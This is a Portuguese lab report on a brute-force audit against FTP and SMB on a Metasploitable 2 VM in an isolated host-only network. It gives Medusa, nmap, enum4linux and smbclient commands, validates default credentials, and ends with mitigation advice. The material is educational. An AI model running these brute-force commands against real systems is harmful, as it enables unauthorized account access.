# 🛡️ Relatório de Auditoria de Segurança: Força Bruta com Kali Linux e Medusa

## 📜 Visão Geral do Projeto

Este relatório documenta uma auditoria de segurança focada na simulação de ataques de **Força Bruta** contra serviços de rede comuns, utilizando as ferramentas **Kali Linux** e **Medusa**. O projeto visa demonstrar a criticidade do uso de credenciais robustas e a necessidade de mecanismos de defesa proativos.

**Alvo:** Máquina Virtual Metasploitable 2 (Ambiente de Teste Controlado)
**Ferramentas:** Kali Linux, Medusa, Nmap (para reconhecimento)

---

## ⚙️ I. Configuração do Ambiente e Reconhecimento

### 1. Topologia da Rede
* **Kali Linux (Atacante):** [192.168.227.129]
* **Metasploitable 2 (Alvo):** [192.168.227.128]
* **Tipo de Rede:** Host-Only.

### 2. Reconhecimento (Nmap)
* **Comando Nmap utilizado:** `nmap -sV 192.168.227.128`
* **Serviços Encontrados:** `ftp, ssh, telnet, smb...`

## 🧩 Requisitos e Preparação do Ambiente

**Pré-requisitos (na máquina atacante — Kali):**
- Kali Linux atualizado (rolling)
- Medusa (v2.x) instalado
- Hydra (opcional) / smbclient / enum4linux / nmap / tcpdump
- Wordlists dentro da pasta `wordlists/`
- Rede: VirtualBox Host-Only (Kali e Metasploitable na mesma rede interna)

**Configuração das VMs**
- Kali Linux (Atacante): IP ex.: `192.168.227.129`
- Metasploitable2 (Alvo): IP ex.: `192.168.227.128`
- Rede: tipo *Host-Only* (garante isolamento)

**Como reproduzir o laboratório (resumo)**
1. Inicie as duas VMs (Kali + Metasploitable2) em VirtualBox com adaptadores em Host-Only.
2. Confirme conectividade: `ping 192.168.227.128`
3. No Kali, verifique ferramentas instaladas:
   ```bash
   medusa -h | head -n 5
   nmap --version
   smbclient --version
   enum4linux -h

---

## ## II. Cenários de Ataque de Força Bruta

> **Observação:** Estes cenários foram executados em ambiente controlado (Metasploitable2) e documentados com evidências (logs e screenshots).

---

### Cenário 1: Quebra de Senha no Serviço FTP (Medusa)

| Protocolo | Porta | Wordlist Utilizada |
| :--- | :---: | :--- |
| FTP | 21 | wordlists/ftp_passwords.txt & users.txt |

**Alvo:** 192.168.227.128 (Metasploitable 2)  
**Ferramenta:** Medusa (`-M ftp`)  
**Objetivo:** Demonstrar força-bruta contra serviço FTP e validar credenciais obtidas.

#### Enumeração / Reconhecimento
```bash
# Reconhecimento rápido do serviço FTP
nmap -sV -p21 192.168.227.128 | tee nmap_ftp.txt

# Comando de Execução (Medusa)
`medusa -M ftp -h 192.168.227.128 -U wordlists/users.txt -P wordlists/ftp_passwords.txt -t 4 -v 4 -f |& tee medusa_ftp_run.log`

# Validação manual (exemplo) 
Use um cliente FTP para validar qualquer credencial encontrada:
`ftp 192.168.227.128
# ou, se preferir, use um cliente que permita user%pass no comando:
# curl --ftp-ssl -u user:password ftp://192.168.227.128/

---

### Cenário 2: Quebra de Senha no Serviço SMB (Medusa)

| Protocolo | Porta | Wordlist Utilizada |
| :--- | :---: | :--- |
| SMB | 139 & 445 | wordlists/smb_passwords_small.txt & wordlists/users.txt |

**Alvo:** 192.168.227.128 (Metasploitable 2)  
**Módulo Medusa:** `smbnt`  
**Objetivo:** Demonstrar força-bruta / password spraying em SMB e validar credenciais obtidas.

#### Enumeração / Reconhecimento
```bash
# Enumerar usuários e shares (salvar saída para evidência)
enum4linux -a 192.168.227.128 | tee enum4linux_all.txt
enum4linux -U 192.168.227.128 | tee enum4linux_users.txt
smbclient -L //192.168.227.128 -N | tee smbclient_shares.txt

# Comando de Execução (Medusa)
`medusa -M smbnt -h 192.168.227.128 -U wordlists/users.txt -P wordlists/smb_passwords_small.txt -t 2 -v 4 -f |& tee medusa_smb_run.log

# Validação manual (exemplo obrigatório)
# Validar credenciais encontradas (ex.: msfadmin:msfadmin)
smbclient //192.168.227.128/IPC$ -U 'msfadmin%msfadmin' -W WORKGROUP -c 'ls; exit' | tee smb_validation_msfadmin.log

# Extra: extrair resultados do log do Medusa
# procurar linhas que indiquem sucesso
grep -E "SUCCESS|FOUND|LOGIN" -i medusa_smb_run.log || true

---

## III. Recomendações de Mitigação e Defesa

Os ataques de Força Bruta contra serviços como FTP e SMB foram bem-sucedidos devido à utilização de senhas fracas e à ausência de mecanismos de limitação de taxa de conexão. Para mitigar o risco, as seguintes ações defensivas são recomendadas:

### 1. Política de Senhas Fortes
* **Forçar Complexidade:** Implementar uma política de senhas que exija um comprimento mínimo (idealmente 14+ caracteres) e a utilização de uma combinação de letras maiúsculas, minúsculas, números e símbolos.
* **Proibição de Padrões:** Banir senhas padrão, comuns ou de dicionário (como "msfadmin", "password", "user").

### 2. Controles de Acesso e Autenticação
* **Bloqueio de IP (Rate Limiting):** Implementar ferramentas de controle de acesso como **Fail2Ban** no servidor. Essa ferramenta monitora logs de autenticação e bloqueia automaticamente endereços IP (o seu alvo é `192.168.227.128`) que tentarem realizar *logins* malsucedidos repetidamente em um curto espaço de tempo.
* **Restrição de Serviços:** Se um serviço (como o FTP ou SMB) não for essencial para o acesso externo, restrinja-o para ser acessível apenas a partir de endereços IP confiáveis na rede interna.

### 3. Criptografia e Segurança do Serviço
* **Desabilitar ou Substituir Serviços Não Criptografados:** O FTP transmite credenciais em texto claro. Substitua o FTP por **SFTP (SSH File Transfer Protocol)** ou **FTPS**, que criptografam a comunicação.
* **Atualização do SO e Serviços:** O Metasploitable 2 está utilizando versões antigas de serviços (como o vsftpd 2.3.4). Manter o sistema operacional e os serviços atualizados garante que vulnerabilidades conhecidas (exploits) sejam corrigidas.
